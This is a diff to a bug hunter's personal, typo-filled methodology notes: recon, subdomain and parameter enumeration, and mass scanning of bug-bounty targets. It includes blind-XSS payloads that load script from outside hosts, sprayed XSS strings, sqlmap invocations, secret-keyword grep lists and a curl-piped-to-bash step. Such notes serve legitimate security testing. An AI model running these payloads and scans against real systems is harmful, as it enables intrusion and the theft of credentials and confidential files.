@@ -1,20 +1,344 @@
 
 Adversarial Thinking for Bug Hunters
      “Make software work in ways it wasn’t intended or expected.”
+     be curious and guess everything, plays with it, and read docs until you realize how it is working
               Security Risk → CWE → CAPEC → Testing Pattern = Attack
+              
+         allows know that you are an attacker, you breaks thinhgs, allows try and do something that will break the system, go against the system
+         
+         
+         check list for evry wep app assesment 
+         https://github.com/sehno/Bug-bounty/blob/master/bugbounty_checklist.md
+         
+         check
+         https://x.com/i/bookmarks?post_id=1792844537225683386
+         
+         
+         tip
+         always check ckecklist and tip
+         
+         
+         NOTE
+         
+              
+              
+              note   https://medium.com/@nanwinata/curiosity-part-2-with-5000-bounty-025536feced7
+              there will always be changes in Shodan results, whether it’s new IPs, new domains, or new ports. Make it a daily routine to start bug bounty hunting, spending the first 1–2 hours repeating this process every day or every week is very reasonable
+              
+           
+              
+               steps to take inoder to understand application
+               
+               1)YouTube    check if there is a video explaination of the program on youtube
+               2) Articles that explain how to use Target.
+               3 Take notes for any information you have, and you can use the xmind program for this.
+               4) Try to imagine scenarios that the malicious user could do in each explanation of a specific function, and take them in Notes and try to apply them in the end.
+               5)  allwys ask alot of question on why there are they using any code and how to break it 
+               
+               
+               
+               tip tip tip
+               NOTE
+                 Match & Replace is a very underrated feature of Burp Suite. I think more people should try to employ it in their test flow. My favorite rules:
+               https://portswigger.net/burp/documentation/desktop/testing-workflow/access-controls/using-match-and-replace
+                   note, match and replace 302 to stop redirecting in burp settings, match 302 replace 200 and stop redircting
+               When checking for any vunerability issues usually IDORS, AUTHTICATION, SQL , Check if you could use burp match and replace
+               example
+               test > test’
+✅ Simply replace false with true. This usually helps to unlock many hidden features of targeted web apps. Note in some cases it could also break the app, so be cautious here.
+✅ Header manipulation. Sometimes it's a good idea to experiment with Referer, Origin, and X-Forwarded-For headers to bypass some weird WAF restrictions. I like to use localhost, or 127.0.0.1 as a value for these headers.
+✅ Replacing session tokens. This one is good for testing IDORs. Alternatively, you could use the autorepeater plugin.
+✅ HTTP parameter values. Sometimes after testing for a while, you could find some parameters like userRole. You could try different values, like changing from user to admin, etc.
+
+   8 THINGS TO MATCH AND REPLACE  
+   1. Attack vector/threat model validation: 
+When fuzzing, try match and replacing a place holder for your payload to quickly verify if an attack path is viable before fully developing it.
+
+ 2) Feature flags / Experiments / A/B Testing: 
+Check for feature flags in SaaS or actively developed apps. Enabling hidden features can significantly expand your attack surface.
+
+3) 3. Creating dynamic fuzzing wordlist: 
+Use placeholders like {domain}, {email}, {ip} in fuzz lists. Replace these dynamically to streamline payload customization across different targets.
+
+4. Client-side enforced RBAC: 
+Identify the front-end's source of truth (e.g., /user API). Look for exploitable parameters like isPaid or isSub to bypass paywalls or client-side RBAC controls.
+
+5. Storing payloads in match and replace: 
+If you have a massive app, or if you’re spraying the same payload in lots of inputs, having a placeholder such as xsspayload which replaces your XSS payload can be a nice timesaver.
+
+6. Header replacements: This one is quite a far-reaching one as headers can be used to enforce or determine a lot of things. Some common ones include:
+
+7. X-Forwarded-For: 127.0.0.1 : 
+Commonly used by proxies to differentiate the origin host of a request but can be passed from the client side to the backend directly if the proxy isn’t configured properly.
+  8. Replacing part of JS files: 
+To debug minified JS, disable source maps to prevent breakpoint issues. This ensures stable debugging but requires working with minified code.             
+              
+              
+
+              A quick one-liner to get most of the wildcard domains of BBPs: 
+curl -s https://raw\.githubusercontent.com/projectdiscovery/public-bugbounty-programs/main/chaos-bugbounty-list.json | jq ".[][] | select(.bounty==true) | .domains[]" -r
+              
+              
+        
+              
+              
+          
+              best resources to find origin IPs
+
+ shodan.io 🡺 Ssl.cert.subject.CN:"domain/subdomain"
+ en.fofa.info 🡺 normal search for domain/subdomain
+ search.censys.io 🡺 normal search for domain/subdomain
+ securitytrails.com  normal search for domain/subdomain
+              
+          USING    AXIOM AND RECOON BY OTHERLY
+          axiom-fleet -i 20 
+          for i in {1..20}; do echo "apple.com" >> target.txt; done
+          axiom-scan target.txt -m update-resolver
+          axiom-scan 2m-subdomain.txt -m split-worldlist
+          axiom-scan target.txt -m puredns-bruteforce -anew apple.com   
+          
+          
+           RECON NOTE 
+           axiom
+           
+           
+            axiom-init
+               axiom-fleet 'worldpay' -l 15
+               $ cd ~/.axiom/modules/  
+                gedit  ~/.axiom/modules/amass.json    or gedit  ~/.axiom/modules/subfinder.json      to edit
+                axiom-scan worldpay-domains -m amass -anew amass.txt
+                axiom-scan worldpay-domains -m subfinder -anew subfinder.txt
+                axiom-scan worldpay-domains -m gau -anew gau.txt
+                cat amass.txt subfinder.txt | sort -u > hostnames.txt
+                axiom-scan hostnames.txt -m dnsx -anew dnsx.txt
+                
+                
+                use of shadon  // awesome shodan,     check censys 
+                   check the company certificate in browers keylock
+                       ssl.cert.subject.CN:"worldpay.com" 200
+                       ssl.cert.subject.CN:"worldpay" 200  -org:"amazon" -org:"akamai"
+                       org: "worldpay" 200  
+                 
+                             google dork
+                                 site:*.example.com inurl:login | inurl:signin Google
+
+                       
+                        org: "worldpay" port:443    //sometime filter out result by click more
+                http.favicon.hash:HASH-http.title:"Title to exclude"      check fav-up github
+             
+                        
+                        
+                        
+                       using uncover for shadan
+                      i dont know why my uncover is not working  check on uncover
+            uncover -silent  -s 'ssl.cert.subject.CN:"worldpay.com" 200 -http.title:"invalid URL" -http.title:"ERROR: The request could not be satisfied" 200' | sort -u | tee shodanIp.txt
+            
+            uncover -s 'ssl.cert.subject.CN:"worldpay" 200' -l 3000 -silent | sort -u | httpx -silent -mc 200 | tee uncovershodanip.txt
+               cat shodanIP.txt | httpx -title -nc -sc -fr -silent -cname | anew httpx-ip.txt 
+               
+               using crt.sh
+               https://crt.sh/?q=worldpay.com&output=json
+               curl -s 'https://crt.sh/?q=worldpay.com&output=json' | jq '.[] | .common_name ' -r
+               curl -s 'https://crt.sh/?q=worldpay.com&output=json' | jq '.[] | .common_name ' -r | sort -u
+               
+               ipinfo.io 
+                 site:ipinfo.io "worldpay"
+                      cat shodanIP.txt | grep 195.35.91   verify if inscope or duplicate
+   
+               
+            
+
+                 
+                       axiom-scan dnsx.txt -m httpx -silent -sc -title -fr -anew httpsdnsx.txt
+                axiom-scn gau.txt -m gau-pdf -anew gau-pdf.txt      check for gau-pdf moduled on myscreensht
+                       axiom-scan hostnames.txt -m httpx -o httpx.txt
+                       cat httpx.txt | grep 200 |grep admin
+                       axiom-rm 'worldpay\*' -f    to delete axiom instances
+     cat gau.txt | grep -oP '^https?://(?:[^/]*/){3}' | sort -u | tee root_dirs.txt     cleaning up gau file
+     cat gau.txt | unfurl keys | awk '!seen[$0]++ {print "?" $0 "=FUZZ"}'    parameter gathering
+         cat gau.txt | unfurl keys | sort -u  > parameter.txt
+                       cat gau.txt | unfurl keys | sort -u | grep -vE '_|/|\?|\\'
+                cat gau.txt | grep -Ei '\.pdf'  | httpx -mc 200 -silent -nc | tee gau-pdf.txt  
+                 cat gau.txt | grep -Ei '\.doc'  | httpx -mc 200 -silent -nc | tee gau-doc.txt  
+  cat gau.txt | grep -Ei '\.doc|\.docx' | wc -l #  | httpx -mc 200 -silent -nc | tee gau-docs.txt   
+  cat gau.txt | grep -Ei '\.xls|\.xlsx'  | httpx -mc 200 -silent -nc | tee gau-xlss.txt 
+  cat gau.txt | shodagrep -Ei '\.zip|\.gz|\.7z|\.tar|\.bz|\.gzip' | httpx -mc 200 -silent -nc | tee gau-compressed.txt 
+  cat gau.txt | grep -Ei '\.php|\.asp|\.do|\.py|\.pl|\.jsp' | httpx -mc 200 -silent -nc | tee gau-backend.txt
+   note** 
+   you still used axiom-scan via nmap and other tools to scan
+    cat gau.txt | grep -Ei 'login|register|signup|signin|sign-up|sign-in'| wc -l # | httpx -mc 200 -silent -nc | tee gau-login.txt 
+    
+     cat root_dirs.txt | grep -Ei 'login|register|signup|signin|sign-up|sign-in'| wc -l # | httpx -mc 200 -silent -nc | tee gau-login.txt 
+     
+     
+     cat link.txt | grep -vE 'google'     this removes  google-link after using link-finder in browsers
+     
+      PORT SCANNING WITH OTHERLY
+      bbscope bc -t <tooken > | tee bbscope.txt
+      
+      nmap -il hosts.txt -pn --min-rate 5000 --max-retries 1 --max-scan-delay 20ms -T4 --top-ports 1000 --exclude-port 22,80,443,53,5060,8080 --open -oG nmap.xml
+      
+      nmap script for finding script
+      curl -s 'https://gist.githubusercontent.com/ott3rly/7bd162b1f2de4dcf3d65de07a530a326/raw/83c68d246b857dcf04d88c2db9d54b4b8a4c885a/nmap-xml-to-httpx.sh' | bash -s - nmap.sml
+      
+      
+      write up
+      curl -s 'https://crt.sh/?q=%22The+Coca-Cola+Company%22&output=json' | jq '.[] | .common_name' -r | sort -u
+      
+       bscope bc -b <TOKEN> | tee bbscope.txt
+        then be sepertaed into two files, hosts.txt, and ips.tzt  and then run nmap
+   nmap -iL hosts.txt -Pn --min-rate 5000 --max-retries 1 --max-scan-delay 20ms -T4 --top-ports 1000 --exclude-ports 22,80,443,53,5060,8080 --open -oX nmap.xml
+   
+   curl -s 'https://gist.githubusercontent.com/ott3rly/7bd162b1f2de4dcf3d65de07a530a326/raw/83c68d246b857dcf04d88c2db9d54b4b8a4c885a/nmap-xml-to-httpx.sh' | bash -s - nmap.xml | httpx -mc 200
+   
+   blind xss
+  1 using waymore for blind xss    check 
+   
+python3 waymore.py -i input.txt -mode U -oU waymore.txt -r 3
+
+cat waymore.txt | grep -viE '\.png|\.jpg|\.jpeg|\.css|\.js|\.svg|\.gif' | grep -iE 'feedback|support' | qsreplace FUZZ | sort -u | httpx -t 300 | anew waymore-filtered.txt
+
+cat waymore.txt | grep -viE '\.png|\.jpg|\.jpeg|\.css|\.js|\.svg|\.gif' | grep -iE 'login|register|auth|sign|account' | qsreplace FUZZ | sort -u | httpx -t 300 | anew waymore-filtered.txt
+  
+  2
+  Filtering  out link_finder file made from site:mil "feedback form" -pdf -doc -xls
+  cat google.txt | grep -Ei '.mil' | httpx | tee google-filtered.txt
+  
+  
+
+  Mass hunting leak filles
+curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/main/chaos-bugbounty-list.json | jq ".[][] | select(.bounty==true) | .domains[]" -r > targets.txt
+
+Install pdftotext CLI utility on each axiom instance.
+sudo apt-get install poppler-utils
+
+Scanning  with axiom-modules
+ 
+[{ 	"command":"for i in cat input | gau --subs --threads 16 | grep -Ea '\\.pdf' | httpx -silent -mc 200; do if curl -s \"$i\" | pdftotext -q - - | grep -Eaiq 'internal use only|confidential'; then echo $i | tee output; fi; done", 	"ext":"txt" }]
+
+~/.axiom/modules/gau-pdfs.json
+
+You can turn on your creative thinking and try to modify this script to your own need. For example, using katana, instead of gau, or checking for other sensitive words, using other extensions and etc. Using own creative approach gives the most bounties!
+
+axiom-scan targets-wildcards.txt -m gau-pdfs -anew pdf-leak-findings.txt
+
+
+removing –subs flag: in gau-pdfs.json 
+
+
+[{ 	"command":"for i in cat input | gau --threads 16 | grep -Ea '\\.pdf' | httpx -silent -mc 200; do if curl -s \"$i\" | pdftotext -q - - | grep -Eaiq 'internal use only|confidential'; then echo $i | tee output; fi; done", 	"ext":"txt" }]
+
+axiom-scan targets.txt -m gau-pdfs -anew pdf-leak-findings.txt
+
+remember to Check for other documents other document types such as doc, docx, xlsx and etc
+
+
+  
+  Mass Scanning for xss     https://ott3rly.com/mass-cross-site-scripting-hunting/
+chaos  -silent -d example.com | tee hostnames.txt
+axiom-fleet xss-hunt -i 8
+edit the httpx.json module located at ~/.axiom/modules/ a little bit to scan more ports
+axiom-scan hostnames.txt -m httpx | tee alive.txt
+
+cat alive.txt | grep -vE "blog|api" | grep 200 | awk '{print $1}' > alive_selected.txt
+
+Collecting Endpoints
+axiom-scan alive_selected.txt -m katana -duc -silent -nc -jc -kf -fx -xhr -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg | tee -a katana.txt
+Using gau
+suggest to use apex subdomains wordlist
+axiom-scan targets-wildcards.txt -m gau | tee -a gau.txt
+cat gau.txt katana.txt | grep -aiE '^http' | grep -aiE '\?' | qsreplace FUZZ > fuzzable_urls.txt
+
+filtered out some specific keywords with gf
+
+cat fuzzable_urls.txt | grep FUZZ | gf xss | grep -iavE 'pdf|txt|\?l=FUZZ$|\?contry=FUZZ$|\?q=FUZZ$|is/image' > filtered_fuzzable_urls.txt
+
+Scanning Cross Site Scripting vulnerabilities
+cat filtered_fuzzable_urls.txt | qsreplace "';a=prompt,a()//" > fuzz.tmp && axiom-scan fuzz.tmp -m freq | grep -v 'Not'
+
+Check  this link for using  freq
+https://github.com/takshal/freq
+And 
+https://ott3rly.com/axiom-module-part-4/ 
+
+   s3 amazon hacking 
+   ttps://ott3rly.com/misconfigured-s3-buckets-axiom-part-5/ 
+   
+   
+     live hacking
+     ffuf -u https://www.worldpay.com/FUZZ  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200,302,301 -t 1000
+     
+     ffuf -u https://www.worldpay.com/FUZZ  -w /usr/share/seclists/Discovery/Web-Content/common.txt
+  
+  uncover -s 'ssl.cert.subject.CN:"worldpay" 200' -l 3000 -silent | sort -u | httpx -silent -mc 200 | tee uncovershodanip.txt
+  
+  
+  
+  Param Mining
+
+echo "target" | gau | sort -u | xargs -P 1 -I {} sh -c 'echo "param mining  => {}" && arjun -u "{}" -m HEADERS'
+
+echo "target" | gau | sort -u | xargs -P 1 -I {} sh -c 'echo "param mining  => {}" && arjun -u "{}" -m POST'
+
+  
+    NOTE
+      when caught a target with  xll or pdf. check fr exiftool github
+      
+      
+      
+      ONELINER FROM LIVE HACKING  AND LIVE RECON FROM OTHER3LY
+  
+      for i in x*; do sqlmap -m "$i" --random-agent --crawl=5 --forms --tamper=space2comment --batch --proxy=https://127.0.0.1:8080 & done       //note the file myuxt be in x and in the same directory
+      
+    echo 'url' | katana -u - -jc -nc -silent -f qurl -kf  -fx -retry 3 -d  5 -aff -ct  6m
+   
+   echo 'smart.com' | gau --subs | gf lfl | tee lfl.txt
+   cat lfi-targets.txt |   nuclei -fr 0nh -silent -t ~/your template.lfl/yaml
+   
+      cat end-points |   nuclei -fr -nh -silent -t ~/your template.lfl/yaml -fr --proxy=http://127.0.0.1:8080 --dast
+      cat end-points |   nuclei -fr -nh -silent -t ~/your template.  sql.yam -fr --proxy=http://127.0.0.1:8080 --dast
+      
+      
+      
+        sqlmap  -u  "smartkelvingsfc/display.action?id=*' --crawl=3 --forms --random-agent | tee sqlmap.yxy
+        
+      sqlmap  -u  "smartkelvingsfc/display.action?id=*' --batch --random-agent --technique=T | tee sqlmap.yxy
+      
+        sqlmap  -u  "smartkelvingsfc/display.action?id=*' --batch --random-agent | tee sqlmap.yxy
+        
+    
+        
+        ghaurl -u 'smart.com/spether/ajax.php' --batch
+      
+      for wordpress sites
+      echo 'smart.com'  nuclie -tags wordpress
+      
+   
+                       
+             
+                
+
+              tip
+              https://medium.com/@jeetpal2007/how-i-found-the-aws-credentials-and-other-api-keys-ccd1bb538d3b           //aws and api-key
+              https://infosecwriteups.com/information-disclosure-story-of-500-400-bounty-97d3b343f9ad
+        go to     https://otx.alienvault.com/indicator/domain/gap.com
+        https://otx.alienvault.com/api/v1/indicators/domain/target.com/url_list?limit=100&page=1     or you can use the gau 
+              
               
          ASSET DISCOVERY WEBSITES
          http://www.crunchbase.com/
          https://tracxn.com/a/dashboard
+          crt.sh
          Whois data
          https://bgp.he.net/         Autonomous System Number (ASN) for Internet-routable IP  or  amass intel -org “<target>
          https://blog.projectdiscovery.io/asnmap/
          https://github.com/hakluke/hakrevdns
+         SSL certificate
          Shodan
          https://securitytrails.com/
               
   tip by dana
-  You got notified of a new in-scope live host 🤠 you visit it, and you come across this page... What's the first thing you try? 😎
+  You got notified of a new in-scope live host 🤠 you visit it, and you come across this page(logiin page)... What's the first thing you try? 😎
   
   *** I’d recon the host. Check all ports and services. DNS enumeration. Cert analysis and check for additional subdomains via vhost discovery. Then I’d try to use the login form with admin:admin via BurpSuite to capture the full request/response and review all client side code. 
 I’d try to cause a real error to get an idea of the tech stack in use, and use that to inform my wordlist choice so I could do a slow directory enumeration from a separate ephemeral IP in the background while I continue to try to figure out what this host does. 
@@ -73,47 +397,127 @@ how to use files everywhere
   old bug resolved
 
 
+   check reconftw    https://github.com/six2dez/reconftw
+   
+   
+     tip
+     In short:
 
-                my recon section
+Use simple censys search like (target.com) and services.software.product=jenkins
+
+Or shodan querries like this: Set-Cookie: mongo-express=” “200 OK”
+Add /jenkins/script to your wordlist.
+
+Major Takeaways:
+
+Never believe a 404 page.
+Censys and Shodan are real friends.
+   
+     
+                MY RECON SECTION                         MY RECON SECTION                       MY RECON SECTION
+   for  large target   use this methodoloy                                          https://drive.google.com/file/d/1bALcKLEswahI8g-_65hggm6Q7395jRIQ/view?pli=1
+   
+   
+                     Netlas.io 
+     tip               https://an0nbil.medium.com/the-only-recon-methodology-you-need-cf6c3aff1af1
+     https://app.netlas.io/certs/?q=certificate.subject.organizational_unit:"Org Name"&page=1&indices=
+     https://app.netlas.io/certs/?q=certificate.subject.organization%3A%22Microsoft%20Corporation%22&page=1
+
+     use this in reccon data flows 
+     domain:/(.*\.)?domain\.[a-z0-9-]*/
+   
+   
+   ./crt.sh -d apple.com | httpx -title -tech-detect -status-code | grep 200
+                
          place all the target in burpdsite  
+         https://whois.arin.net/ui/
                                  1
                subdomain enumeration
-               amass, subfinder, assetfinder and sublister, findomain
+               amass, subfinder, assetfinder and sublister, findomain.   knockpy
+               
+                 using BBOT
+               check   • https://github.com/blacklanternsecurity/bbot
+               
+               
+               USING ./RECONFTW       https://github.com/six2dez/reconftw?tab=readme-ov-file
+               
+               ./reconftw.sh -d target.com -r
+               ./reconftw.sh -l sites.txt -r -o /output/directory/
+              
                
                amass
                nano $HOME/.config/amass/config.yaml            add your api keys on this file
                amass enum -active -df domains.txt -config $HOME/.config/amass/config.yaml -o amass_subdoamins.txt
+               amass enum -asn 17012 -d paypal.com                                                                                                          discover more of your assets by specifying your ASN with Amass?
            amass intel -org "Tesla"         maybe for large scope and compaines
                    amass intel -active -asn 394161
           amass enum -asn -d tesla.com
           amass enum [-active] [-ip] -d target
-           amass enum -d tesla.com | grep target
+       
         amass enum -d target.com -o /filepath/subdomains.txt
           amass enum [-active] [-ip] -d target.com
            amass enum -d target.com | grep target.com  # To just list subdomains
            
-                          assetfinder 
+           amass enum -passive -d example.com -o results.txt
+
+           
+            tip
+     Amass clean output using oam-tools.
+     1    . Install oam-tools (https://shorturl.at/eowA4)
+     2. Use Amass normally(amass enum -d target. com)
+     3. Use oam to get clean results:
+      oam_subs -names -d target .com
+      
+      check    github
+      • https://github.com/blacklanternsecurity/bbot
+              
+                sublist3r
+                pyhton sublist3r -d url -b optional
+                • sublist3r -d example.com
+                
+                    knockpy
+      knockpy -d domain.com --recon --bruteforce --save report
+        
+            assetfinder 
                         cat domains | assetfinder -subs-only
+                        assetfinder -subs-only domain.com >> subdomains.txt
+        
+        
+        FIND SUB-DOMAINS OF SUB-DOMAIN
+        altdns -i subdomains.txt -o data_output -w words.txt -r -s results_output.txt                                                          https://github.com/infosec-au/altdns
+        ./subbrute.py –t subdomains.txt
+        check for altex
+      
+      
+           
+              crt
+              
+     curl -s https://crt.sh/\?q\=\domain.com\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' >>subdomains.txt
+           
+                      
                
                subfinder 
                ~/.config/subfinder/provider-config.yaml     add  your api keys
                subfinder -d target.com -silent | httpx -silent -o urls.txt
                 subfinder -d url - active | tee -a subfinder.txt
                 subfinder -d google.com -all > subdomain.txt
+             
+            
                 Discover subdomains, identify JavaScript files (with HTTP response status 200), and save the results in separate files
                 subfinder -d target.com | httpx -mc 200 | tee subdomains.txt && cat subdomains.txt | waybackurls | httpx -mc 200 | grep .js | tee js.txt
-                
+                 subfinder -d targetdomain.com -silent | httpx | nuclei -t technologies/tech-detect.yaml
                 
                 If you have domains.txt file now you wanna check for admin panel the file
                  subfinder -d target[.]com -silent | sed 's/$/\/admin/' | httpx -title -status-code -content-length
                  Blind XSS In X-Forwarded-For Header
                  subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"	
-                 
+                 subfinder -d example.com --all --recursive > subdomain.txt                                                                         coffin
+                       
+                       
+                       
+              
+             
         
-                cat js.txt | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password ftp            password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret"
-                
-                sublist3r
-                pyhton sublist3r -d url -b optional
                 
                 
                brute force subdomain
@@ -132,10 +536,59 @@ how to use files everywhere
                NEW SUBDOMAINS FOR YOUR TARGET?
                curl -s --request GET --url https://api.securitytrails.com/v1/domain/target.com/subdomains?apikey=API_KEY | jq '.subdomains[]' | sed 's/\"//g' >test.txt 2>/dev/null && sed "s/$/.target.com/" test.txt | sed 's/ //g' && rm test.txt
                
+               Simple tip for port scan 
+1) after enumerat your subdomains save in  subs.txt
+2) run this command 
+"cat subs.txt | dnsx -a -ro | naabu -silent  -top-ports 1000 -exclude-ports 80,443,21,22,25 -o ports.txt"
+    
+    
+              making subdomian permutaion and guess , if this is a large target  and then pass to httpx for live subdomin
+              cat subfinder.txt | alterx | tee alterxsubfinder.txt
+              subfinder -d tesla.com | alterx | dnsx
+              echo gcash.com | alterx -pp 'word=subdomains-top1million-50000.txt' | dnsx 
+              
+                       tip
+                 check        https://github.com/Tedixx/dmarc-subdomains/  for extra subdomain
+                 
+                 
+                 maping IP/asn of a target
+                  asnmap -a AS45596 -silent
+                  asnmap -i 100.19.12.21 -silent
+                 echo target.com | asnmap | naabu -p 443 | httpx | nuclei -id tech-detect
+                 https://github.com/projectdiscovery/asnmap
+                 echo AS54115 | asnmap | dnsx -ptr
+                 echo AS54115 | asnmap | naabu -p 443
+                   echo AS54115 | asnmap | naabu -p 443 | httpx 
+                 
+                 
+                 using naabu
+                 naabu -iL bbc.txt | tee bbcportscan.txt                              check open ports
+                 
+                 
+                 
+                 
+                 
+               
                  2
-                 cat subdomains.txt | sort -u >> uniq_subs.txt         remove all duplicates subdomain
-                FILTERING OUT LIVE SUBDOMIN
                  httpx and httprobe
+                 
+                 The options I like to use when getting alive subdomains:
+cat domains.txt | httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -sc -cl -title -t 100 -fr -nc | anew alive.txt                                              cofin
+subfinder -d example.com | httxpx-toolkit --silent | katana -ps -f qurl | gf xss | bxss --appendMode --payload "<script src=https://xss.report/c/coffinxp></script>" --parameters                                coffin
+                 
+                 
+                FILTERING OUT LIVE SUBDOMIN  and DNS Resolution 
+                 
+               httpx -l all-subs.txt  -sc  -ip  -rl 10 -o alive_subs.txt in 
+           cat subdomain.txt | httxpx-toolkit --ports 80,443,8080,8000,8888 --threads 200 > subdomains_alive.txt
+               
+            cat target.txt  |   htttpx -status-code -title -tech-detect -tls-grab -vhost -list 
+                 
+                 cat subdomains.txt | sort -u >> uniq_subs.txt         remove all duplicates subdomain
+                 rm subdomains.txt && mv 1.txt subdomains.txt
+                 cat  subdomains.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > alive.txt
+                 httpx -l targets.txt -sc -location -title -server -td -ip -t 100 -o httpx.out
+
                  
                  # Check status of urls and make new file
                  
@@ -144,7 +597,7 @@ how to use files everywhere
                  httpx -l subdomains.txt -ports 80,8080,8000,8888 -threads 200 > subdomains_alive.txt
                 cat file.txt | httpx -sc
                 cat uniq_subs.txt | httpx -o httpx
-  
+    
  
   
                   Httprobe 
@@ -160,20 +613,667 @@ how to use files everywhere
                   
                   /// cat subtxt sub2.txt sub3.txt | sort -u //
                   
+                 port scanning
+                 naabu --list alive.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabuports.txt
+                  
                   
             3
                check for contetnt discovery
                dirb, gobuster,ffuf
                dirb https://example.com
                dirsearch -u https://example.com
+               dirsearch -e php,html,js -u https://example.com -w /usr/share/wordlists/dirb/common.txt
                ffuf -u 'https://example.com' -H 'Host: FUZZ.example.com' -w Seclists/Discovery/DNS/top-1million-11.txt
                ffuf -u 'https://example.com' -H 'Host: FUZZ.example.com' -w Seclists/Discovery/DNS/top-1million-11.txt -fs 4517          //filter
-               ffuf -u https://www.example.com/FUZZ -w wordlist/Seclists/Discovery/Web-content/raft-medium-files.txt -mc 200,302,301 -t 1000
-               
+           ffuf -u https://www.example.com/FUZZ -w wordlist/Seclists/Discovery/Web-content/raft-medium-files.txt -mc 200,302,301 -t 1000    or
+           ffuf -c -u https://targe.com/FUZZ -w /root/Desktop/paths.txt -mc 200-299,300-302,403,500 -r -t 200
+           
+           
+                                       coffin
+           dirsearch -u https://example.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http,tar.gz,sql,tar.gz,sql~,swp,tar,bz2,tar.bz2,tar.gz,txt,wadl,zip,log,xml,~js,.json
 
+                cat list.txt | ffuf -w - -u https://target.com/FUZZ
+                
+                check if you could curl to get some get request from status 200 of ffuf
+                https://medium.com/@red.whisperer/how-a-blackbox-target-turned-to-whitebox-with-recon-e46536672702
+                curl https://rg.target.com/v2/admin-REDACTED/tags/list
+                curl https://rg.target.com/v2/admin-REDACTED/manifests/1.10
+               
                
                           4 
-                 finding parameters, 
+                 finding parameters / params discovery
+                 arjun , paramspider ,gf  check github
+                 
+                
+                 paramspider -l domains.txt       check its saving of fills  
+                 paramspider -d example.com --proxy '127.0.0.1:8080'         web proxy to burp
+                 
+                 cat targets | xargs -n 1 -I {} python3 ~/ParamSpider/paramspider.py --subs False --domain {} --level high | urldedupe >> all-param.txt
+                 
+                 
+        
+                 arjun -u https://example[.]com - tweak with -m POST for method precision.
+                 arjun -u https://www.example.com/file.php 
+                 paramspider -l domains.txt -s
+                 python3 paramspider[.]py -d example[.]com --level
+                 gospider -S domains.txt -o gospider
+                
+                 
+                 5
+                 URL RECON - EXTRACTION  and find sensitive files 
+                 gau, gospider, katana, gauplus
+                 
+               
+                 
+                    katana     check my katana docs down
+                 $ cat in_scope.txt        
+                login/
+                 admin/
+                 app/
+                wordpress/
+                 katana -u https://tesla.com -cs in_scope.txt
+                 katana -u subdomains_alive.txt -d 5 -ps -rss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt                                   coffin
+                 
+                 gau
+                 echo "url" |gau | tee gau.txt
+                 
+                 cat gau.txt | unfurl keys | sort -u | grep -vE '_|/|\?|\\'
+                 cat gau.txt | grep -E '\.pdf' | sort -u | httpx -mc 200 | tee .gauPdf.txt        you could change the pdf to any file like xls,doc
+                gau  -oP '^https?://(?:[^/]*/){2}' gau.txt | sort -u | httpx -mc 200 | tee gau.txt
+      cat gau.txt | grep -Ei 'login|register|signup|signin|sign-in|sign-up|dashboard' | httpx -mc 200 > authendpoint.txt     //check sqli to login   
+                
+              
+                
+               cat gau.txt | grep ? | tee param.txt     /// filter out url
+  gau $mytarget|egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 SecretFinder.py -i %% -o cli -r "$anything"'
+  
+      cat alive.txt | gau --o dirs.txt
+      cat dirs.txt | grep "?" > params.txt 
+      cat dirs.txt | grep ".js"$ > jsfiles.txt
+                  
+                  
+                  
+                 gospider    check for goSpider github
+                    
+               Gospider -s (url) --subs --js || tee gospider.txt
+               gospider -S domains.txt -o gospider
+               
+               SINGLE TARGET
+               gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
+               
+               MUITIPLE TARGET 
+               gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
+               
+               GOSPIDER XSS
+               gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
+               gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
+               
+               
+              fillter files fron it
+             cat url.txt | awk "{print& 3}" | grep -E https:// | tee url.filter.txt
+                 cat gspider.txt |awk '[print$]' | grep -E url | tee gospider.txt
+                 
+                 katana -list urls.txt -v -jc -o katana
+                 katana -u http://testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt
+                 
+                    # Search for testing point with gau and fff
+                  gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt
+                 sort -u urls.txt | fff -s 200 -o out/
+                 
+
+                    CHECK “FILES ” FOR DUPLICATES      CHECK “FILES ” FOR DUPLICATES        CHECK “FILES ” FOR DUPLICATES
+                    cat file.txt | uro filteredparams.txt   
+                    
+                 
+                 
+                      
+                     JAVASCRIPTS FILES
+                     
+                       discovering javascript files
+        subfinder -d domain.com | httpx -mc 200 | tee subdomains.txt && cat subdomains.txt | waybackurls | httpx -mc 200 | grep .js | tee js.txt
